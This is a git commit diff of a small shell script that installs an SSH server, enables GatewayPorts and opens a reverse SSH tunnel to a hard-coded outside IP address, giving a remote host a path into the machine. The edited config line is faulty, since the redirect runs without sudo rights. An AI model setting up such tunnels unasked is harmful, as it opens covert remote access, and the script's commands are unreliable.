2f1f3dbd3b911173b12058e3dda9e55e7521a678
gizmo87898 <73662348+gizmo87898@users.noreply.github.com>
2022-04-25 09:08:30 -0400

    Update cool.sh

--- cool.sh
+++ cool.sh
@@ -1,7 +1,7 @@
 sudo apt update
 sudo apt install openssh-server -y
 sudo ufw allow ssh
-sudo /etc/ssh/sshd_config << "GatewayPorts yes"
+sudo echo "GatewayPorts yes" >> /etc/ssh/sshd_config
 systemctl reload ssh.service
 
 ssh -R 22:127.0.0.1:2222 gizmo@75.138.184.49
